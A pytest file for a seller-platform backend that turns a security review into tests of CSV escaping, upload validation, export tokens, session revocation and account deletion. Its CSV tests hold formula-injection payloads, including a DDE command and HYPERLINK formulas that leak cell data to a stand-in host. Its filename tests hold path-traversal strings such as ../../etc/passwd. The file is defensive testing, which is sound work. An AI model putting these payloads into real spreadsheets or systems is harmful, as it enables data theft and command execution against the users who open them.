"""The Phase F security review, as tests.

Master spec section 47 and the Phase F brief's section 27. Each class here is
one item from that checklist, and each test is named after the thing that must
not be possible. A finding without a test is a finding that comes back.

Covered here: CSV formula injection, upload validation, export leakage and
authorisation, session and device revocation, refresh-token reuse, deletion
authorisation, and the seller/admin boundary from the data side.

Covered elsewhere: tenant isolation (``test_tenant_isolation.py``), billing
replay (``test_billing.py``), role permissions and the admin boundary
(``test_admin.py``, ``test_team.py``).
"""

from __future__ import annotations

import uuid
from datetime import timedelta
from typing import Any

import pytest
import sqlalchemy as sa
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession
from tests.conftest_commerce import create_order, create_product, signed_in_shop
from tests.test_auth_flow import auth_header, sign_in

from app.common.audit import AuditAction, AuditLog
from app.common.safe_csv import SafeCsvWriter, escape_cell, rows_to_csv
from app.common.uploads import DetectedFormat, safe_filename, validate_upload
from app.core.clock import utc_now
from app.core.errors import ValidationError
from app.exports.models import ExportJob, ExportStatus

# --------------------------------------------------------------------------- #
# CSV formula injection (Phase F brief section 28)
# --------------------------------------------------------------------------- #


class TestCsvFormulaSafety:
    @pytest.mark.parametrize(
        "dangerous",
        [
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(A1)",
            '=HYPERLINK("http://evil.invalid?"&A1,"Click me")',
            "=cmd|'/c calc'!A1",
            # Excel strips leading whitespace and control characters before it
            # decides whether a cell is a formula.
            "\t=1+1",
            "\r=1+1",
            "   =1+1",
        ],
    )
    def test_a_formula_is_escaped(self, dangerous: str) -> None:
        escaped = escape_cell(dangerous)
        assert escaped.startswith("'"), escaped
        assert dangerous.strip("\t\r\n ") in escaped

    @pytest.mark.parametrize(
        "harmless",
        ["Rina Akter", "House 12, Road 3", "01712345678", "১২৩ টাকা", "", "0-1-2"],
    )
    def test_ordinary_text_is_left_alone(self, harmless: str) -> None:
        assert not escape_cell(harmless).startswith("'")

    def test_a_cell_cannot_smuggle_a_second_row(self) -> None:
        """A newline inside a cell would hide a second leading '=' from review."""
        escaped = escape_cell("Rina\n=1+1")
        assert "\n" not in escaped
        assert escaped == "Rina =1+1"

    def test_a_customer_name_reaches_the_file_escaped(self) -> None:
        content = rows_to_csv(
            ["name", "phone"], [['=HYPERLINK("http://evil.invalid")', "01712345678"]]
        ).decode("utf-8-sig")
        assert '"\'=HYPERLINK(""http://evil.invalid"")"' in content

    def test_headers_are_escaped_too(self) -> None:
        """A header can come from a seller-supplied column name."""
        writer = SafeCsvWriter(["=cmd", "name"])
        assert writer.getvalue().startswith("'=cmd,name")

    def test_the_file_carries_a_bom_so_excel_reads_bangla(self) -> None:
        content = rows_to_csv(["name"], [["রিনা আক্তার"]])
        assert content.startswith(b"\xef\xbb\xbf")
        assert "রিনা আক্তার" in content.decode("utf-8-sig")


# --------------------------------------------------------------------------- #
# Upload hardening (Phase F brief section 29)
# --------------------------------------------------------------------------- #


class TestUploadValidation:
    def test_an_xlsx_renamed_to_csv_is_refused(self) -> None:
        """The name and the MIME type both lie; the ZIP magic number does not."""
        xlsx = b"PK\x03\x04" + b"\x00" * 200
        with pytest.raises(ValidationError) as exc:
            validate_upload(xlsx, filename="statement.csv", content_type="text/csv")
        assert exc.value.details["detected"] == str(DetectedFormat.XLSX)

    def test_a_pdf_is_refused(self) -> None:
        with pytest.raises(ValidationError):
            validate_upload(b"%PDF-1.7\n...", filename="statement.csv")

    def test_an_oversized_file_is_refused_by_size(self) -> None:
        with pytest.raises(ValidationError) as exc:
            validate_upload(b"a" * 2048, filename="big.csv", max_bytes=1024)
        assert exc.value.details["max_bytes"] == "1024"

    def test_an_empty_file_is_refused(self) -> None:
        with pytest.raises(ValidationError):
            validate_upload(b"", filename="empty.csv")

    def test_a_binary_is_refused_rather_than_mangled(self) -> None:
        with pytest.raises(ValidationError):
            validate_upload(b"\x00\x01\x02\x03payload", filename="x.csv")

    def test_a_disallowed_extension_is_refused(self) -> None:
        with pytest.raises(ValidationError) as exc:
            validate_upload(b"name,phone\n", filename="script.exe")
        assert exc.value.details["extension"] == ".exe"

    def test_the_row_limit_is_enforced_before_parsing(self) -> None:
        content = ("a,b\n" * 50).encode()
        with pytest.raises(ValidationError) as exc:
            validate_upload(content, filename="rows.csv", max_rows=10)
        assert exc.value.details["max_rows"] == "10"

    def test_a_utf8_bom_is_read_not_refused(self) -> None:
        """Excel writes one. Refusing it would reject most real uploads."""
        checked = validate_upload("﻿name,phone\nরিনা,017\n".encode(), filename="a.csv")
        assert checked.text.lstrip("﻿").startswith("name,phone")

    @pytest.mark.parametrize(
        ("given", "expected"),
        [
            ("../../etc/passwd", "passwd"),
            ("..\\..\\windows\\system32", "system32"),
            ("statement 2026.csv", "statement_2026.csv"),
            ("", "upload.csv"),
            ("...", "upload.csv"),
            ("a" * 300 + ".csv", "a" * 120),
        ],
    )
    def test_filenames_are_sanitised(self, given: str, expected: str) -> None:
        assert safe_filename(given) == expected

    async def test_the_import_endpoint_refuses_a_disguised_xlsx(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        session = await signed_in_shop(client, unique_phone, shop_name="Upload Shop")
        response = await client.post(
            "/v1/imports",
            data={"template": "PRODUCTS"},
            files={"file": ("products.csv", b"PK\x03\x04" + b"\x00" * 100, "text/csv")},
            headers=auth_header(session),
        )
        assert response.status_code == 422
        assert "Excel" in response.json()["message_en"]


# --------------------------------------------------------------------------- #
# Exports (master spec section 99)
# --------------------------------------------------------------------------- #


class TestExports:
    async def _shop(self, client: AsyncClient, phone: str) -> dict[str, Any]:
        session = await signed_in_shop(client, phone, shop_name="Export Shop", plan="pro")
        await create_product(client, session, name="Abaya", sku="EXP-1")
        await create_order(client, session, phone="01755000001")
        return session

    async def test_an_export_is_gated_by_the_plan(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        """Free has no CSV export (section 26)."""
        session = await signed_in_shop(client, unique_phone, shop_name="Free Export")
        response = await client.post(
            "/v1/exports", json={"kind": "ORDERS"}, headers=auth_header(session)
        )
        assert response.status_code == 402
        assert response.json()["details"]["entitlement"] == "csv_export"

    async def test_an_export_returns_its_token_once(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        session = await self._shop(client, unique_phone)
        created = await client.post(
            "/v1/exports", json={"kind": "ORDERS"}, headers=auth_header(session)
        )
        assert created.status_code == 201, created.text
        body = created.json()
        assert body["download_token"]
        assert body["status"] == "READY"
        assert body["row_count"] == 1

        listed = (await client.get("/v1/exports", headers=auth_header(session))).json()
        assert listed[0]["download_token"] is None, "the token is never listed again"

    async def test_a_download_needs_both_the_session_and_the_token(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        session = await self._shop(client, unique_phone)
        created = (
            await client.post("/v1/exports", json={"kind": "ORDERS"}, headers=auth_header(session))
        ).json()

        no_token = await client.get(
            f"/v1/exports/{created['id']}/download?token=wrong-token-entirely",
            headers=auth_header(session),
        )
        assert no_token.status_code == 404

        no_session = await client.get(
            f"/v1/exports/{created['id']}/download?token={created['download_token']}"
        )
        assert no_session.status_code == 401

        good = await client.get(
            f"/v1/exports/{created['id']}/download?token={created['download_token']}",
            headers=auth_header(session),
        )
        assert good.status_code == 200
        assert good.headers["cache-control"] == "no-store, private"
        assert "attachment" in good.headers["content-disposition"]

    async def test_another_shop_cannot_download_with_a_leaked_token(
        self, client: AsyncClient
    ) -> None:
        """The token alone is not enough; the tenant scope is checked too."""
        first = await self._shop(client, "01756000001")
        second = await signed_in_shop(client, "01756000002", shop_name="Other", plan="pro")
        created = (
            await client.post("/v1/exports", json={"kind": "ORDERS"}, headers=auth_header(first))
        ).json()

        stolen = await client.get(
            f"/v1/exports/{created['id']}/download?token={created['download_token']}",
            headers=auth_header(second),
        )
        assert stolen.status_code == 404

    async def test_an_export_is_escaped(self, client: AsyncClient, unique_phone: str) -> None:
        """The whole point of the escaping, end to end."""
        session = await signed_in_shop(client, unique_phone, shop_name="Escape Shop", plan="pro")
        await client.post(
            "/v1/customers",
            json={"phone": "01757000001", "name": '=HYPERLINK("http://evil.invalid")'},
            headers=auth_header(session),
        )
        created = (
            await client.post(
                "/v1/exports", json={"kind": "CUSTOMERS"}, headers=auth_header(session)
            )
        ).json()
        content = (
            await client.get(
                f"/v1/exports/{created['id']}/download?token={created['download_token']}",
                headers=auth_header(session),
            )
        ).text
        assert "'=HYPERLINK" in content
        assert "\n=HYPERLINK" not in content

    async def test_an_expired_export_is_refused_and_its_content_dropped(
        self, client: AsyncClient, unique_phone: str, system_db: AsyncSession
    ) -> None:
        session = await self._shop(client, unique_phone)
        created = (
            await client.post("/v1/exports", json={"kind": "ORDERS"}, headers=auth_header(session))
        ).json()

        job = await system_db.get(ExportJob, uuid.UUID(created["id"]))
        assert job is not None
        job.expires_at = utc_now() - timedelta(minutes=1)
        await system_db.commit()

        refused = await client.get(
            f"/v1/exports/{created['id']}/download?token={created['download_token']}",
            headers=auth_header(session),
        )
        assert refused.status_code == 409

    async def test_requesting_and_downloading_are_separately_audited(
        self, client: AsyncClient, unique_phone: str, system_db: AsyncSession
    ) -> None:
        session = await self._shop(client, unique_phone)
        created = (
            await client.post("/v1/exports", json={"kind": "ORDERS"}, headers=auth_header(session))
        ).json()
        await client.get(
            f"/v1/exports/{created['id']}/download?token={created['download_token']}",
            headers=auth_header(session),
        )

        actions = {
            row.action
            for row in (
                await system_db.execute(
                    sa.select(AuditLog).where(
                        AuditLog.entity_id == created["id"],
                    )
                )
            ).scalars()
        }
        assert str(AuditAction.EXPORT_REQUESTED) in actions
        assert str(AuditAction.EXPORT_DOWNLOADED) in actions

    async def test_expiring_stale_exports_keeps_the_record(
        self, client: AsyncClient, unique_phone: str, system_db: AsyncSession, settings
    ) -> None:
        from app.api.deps import get_hasher
        from app.exports.service import ExportService

        session = await self._shop(client, unique_phone)
        created = (
            await client.post("/v1/exports", json={"kind": "ORDERS"}, headers=auth_header(session))
        ).json()

        job = await system_db.get(ExportJob, uuid.UUID(created["id"]))
        assert job is not None
        job.expires_at = utc_now() - timedelta(minutes=1)
        await system_db.flush()

        service = ExportService(system_db, settings=settings, hasher=get_hasher(settings))
        assert await service.expire_stale() >= 1
        assert job.status == str(ExportStatus.EXPIRED)
        assert job.content is None
        assert job.download_token_hash is None
        assert job.row_count == 1, "the record of what was exported survives"


# --------------------------------------------------------------------------- #
# Sessions and devices (master spec section 89)
# --------------------------------------------------------------------------- #


class TestSessionSecurity:
    async def test_a_seller_can_see_their_devices_without_seeing_a_push_token(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        session = await signed_in_shop(client, unique_phone, shop_name="Device Shop")
        response = await client.get("/v1/account/devices", headers=auth_header(session))
        assert response.status_code == 200
        devices = response.json()
        assert devices
        assert devices[0]["is_current"] is True
        assert "push_token" not in devices[0]

    async def test_revoking_a_device_ends_its_sessions_now(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        first = await signed_in_shop(client, unique_phone, shop_name="Device Shop")
        second = await sign_in(client, unique_phone)

        devices = (await client.get("/v1/account/devices", headers=auth_header(first))).json()
        # Both sign-ins used the same install id, so there is one device; the
        # second sign-in created a second session on it.
        target = devices[0]["id"]

        revoked = await client.post(
            f"/v1/account/devices/{target}/revoke", headers=auth_header(first)
        )
        assert revoked.status_code == 204
        after = await client.get("/v1/account/devices", headers=auth_header(second))
        assert after.status_code == 401

    async def test_a_device_belonging_to_someone_else_is_a_404(self, client: AsyncClient) -> None:
        """Not a 403: confirming the id exists is itself information."""
        first = await signed_in_shop(client, "01758000001", shop_name="Mine")
        await signed_in_shop(client, "01758000002", shop_name="Theirs")
        theirs = await sign_in(client, "01758000002")
        their_devices = (
            await client.get("/v1/account/devices", headers=auth_header(theirs))
        ).json()

        response = await client.post(
            f"/v1/account/devices/{their_devices[0]['id']}/revoke",
            headers=auth_header(first),
        )
        assert response.status_code == 404

    async def test_logout_others_keeps_the_current_session(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        first = await signed_in_shop(client, unique_phone, shop_name="Logout Shop")
        second = await sign_in(client, unique_phone)

        response = await client.post("/v1/account/logout-others", headers=auth_header(first))
        assert response.status_code == 204

        assert (
            await client.get("/v1/account/devices", headers=auth_header(first))
        ).status_code == 200
        assert (
            await client.get("/v1/account/devices", headers=auth_header(second))
        ).status_code == 401

    async def test_refresh_token_reuse_still_kills_the_session(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        """Phase A's detection, re-asserted after Phase F touched sessions."""
        session = await sign_in(client, unique_phone)
        original = session["refresh_token"]

        rotated = await client.post("/v1/auth/refresh", json={"refresh_token": original})
        assert rotated.status_code == 200

        replayed = await client.post("/v1/auth/refresh", json={"refresh_token": original})
        assert replayed.status_code == 401

        # The whole session, including the token issued by the legitimate
        # rotation, is dead.
        after = await client.post(
            "/v1/auth/refresh", json={"refresh_token": rotated.json()["refresh_token"]}
        )
        assert after.status_code == 401


# --------------------------------------------------------------------------- #
# Account deletion (master spec section 100)
# --------------------------------------------------------------------------- #


class TestAccountDeletion:
    async def test_the_privacy_screen_says_what_is_kept(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        session = await signed_in_shop(client, unique_phone, shop_name="Privacy Shop")
        body = (await client.get("/v1/account/privacy", headers=auth_header(session))).json()
        assert body["grace_days"] > 0
        assert body["deletion_requested"] is False
        assert any("ledger" in item.lower() for item in body["retained_after_deletion"])
        assert any("phone" in item.lower() for item in body["anonymised_on_deletion"])

    async def test_deletion_is_scheduled_not_immediate(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        session = await signed_in_shop(client, unique_phone, shop_name="Delete Shop")
        response = await client.post(
            "/v1/account/delete",
            json={"confirm": "DELETE", "reason": "closing the business"},
            headers=auth_header(session),
        )
        assert response.status_code == 200, response.text
        assert response.json()["status"] == "SCHEDULED"

        # Access continues during the cooling-off period on purpose.
        assert (await client.get("/v1/orders", headers=auth_header(session))).status_code == 200

    async def test_deletion_can_be_cancelled(self, client: AsyncClient, unique_phone: str) -> None:
        session = await signed_in_shop(client, unique_phone, shop_name="Delete Shop")
        await client.post(
            "/v1/account/delete", json={"confirm": "DELETE"}, headers=auth_header(session)
        )
        cancelled = await client.post("/v1/account/delete/cancel", headers=auth_header(session))
        assert cancelled.status_code == 200
        assert cancelled.json()["status"] == "CANCELLED"

    async def test_a_second_request_is_a_conflict(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        session = await signed_in_shop(client, unique_phone, shop_name="Delete Shop")
        await client.post(
            "/v1/account/delete", json={"confirm": "DELETE"}, headers=auth_header(session)
        )
        again = await client.post(
            "/v1/account/delete", json={"confirm": "DELETE"}, headers=auth_header(session)
        )
        assert again.status_code == 409

    async def test_a_non_owner_cannot_delete_the_shop(
        self, client: AsyncClient, unique_phone: str
    ) -> None:
        owner = await signed_in_shop(client, unique_phone, shop_name="Owned Shop", plan="pro")
        await client.post(
            "/v1/team",
            json={"phone": "01759000001", "role": "MANAGER"},
            headers=auth_header(owner),
        )
        manager = await sign_in(client, "01759000001")

        response = await client.post(
            "/v1/account/delete",
            json={"confirm": "DELETE"},
            headers=auth_header(manager),
        )
        assert response.status_code == 403

    async def test_execution_anonymises_people_and_keeps_the_money(
        self, client: AsyncClient, unique_phone: str, system_db: AsyncSession
    ) -> None:
        """Section 100's retention rule, asserted on real rows."""
        from app.customers.models import Customer
        from app.ledger.models import LedgerEntry
        from app.privacy.service import PrivacyService

        session = await signed_in_shop(client, unique_phone, shop_name="Doomed Shop", plan="pro")
        tenant_id = uuid.UUID(session["tenant_id"])
        await create_product(client, session, name="Kurti", sku="DEL-1")
        await create_order(client, session, phone="01755111222")

        ledger_before = int(
            (
                await system_db.execute(
                    sa.select(sa.func.count())
                    .select_from(LedgerEntry)
                    .where(LedgerEntry.tenant_id == tenant_id)
                )
            ).scalar_one()
        )

        service = PrivacyService(system_db)
        request = await service.request_deletion(
            tenant_id=tenant_id, user_id=uuid.UUID(session["user_id"])
        )
        outcome = await service.execute(request)
        await system_db.flush()

        customers = (
            (await system_db.execute(sa.select(Customer).where(Customer.tenant_id == tenant_id)))
            .scalars()
            .all()
        )
        assert customers
        for customer in customers:
            assert customer.phone_enc == ""
            assert customer.phone_search_hmac.startswith("deleted:")
            assert "01755111222" not in (customer.phone_masked or "")
            assert customer.name.startswith("Customer ")

        ledger_after = int(
            (
                await system_db.execute(
                    sa.select(sa.func.count())
                    .select_from(LedgerEntry)
                    .where(LedgerEntry.tenant_id == tenant_id)
                )
            ).scalar_one()
        )
        assert ledger_after == ledger_before, "financial records are retained"
        assert outcome.steps["customers_anonymised"] >= 1
        assert "ledger" in str(outcome.steps["financial_records_retained"])

    async def test_execution_revokes_every_session(
        self, client: AsyncClient, unique_phone: str, system_db: AsyncSession
    ) -> None:
        from app.privacy.service import PrivacyService

        session = await signed_in_shop(client, unique_phone, shop_name="Doomed Shop")
        tenant_id = uuid.UUID(session["tenant_id"])

        service = PrivacyService(system_db)
        request = await service.request_deletion(
            tenant_id=tenant_id, user_id=uuid.UUID(session["user_id"])
        )
        await service.execute(request)
        await system_db.commit()

        assert (await client.get("/v1/orders", headers=auth_header(session))).status_code == 401

    async def test_a_user_who_owns_another_shop_is_left_alone(
        self, client: AsyncClient, system_db: AsyncSession
    ) -> None:
        """Deleting one shop is not a request to delete the person's other one."""
        from app.privacy.service import PrivacyService
        from app.users.models import User, UserStatus

        first = await signed_in_shop(client, "01754000001", shop_name="Shop One")
        second = await client.post(
            "/v1/tenants",
            json={"name": "Shop Two", "business_category": "CLOTHING"},
            headers=auth_header(first),
        )
        assert second.status_code == 201, second.text

        service = PrivacyService(system_db)
        request = await service.request_deletion(
            tenant_id=uuid.UUID(second.json()["tenant_id"]),
            user_id=uuid.UUID(first["user_id"]),
        )
        await service.execute(request)
        await system_db.flush()

        user = await system_db.get(User, uuid.UUID(first["user_id"]))
        assert user is not None
        assert user.status == str(UserStatus.ACTIVE)
        assert user.phone_enc != ""
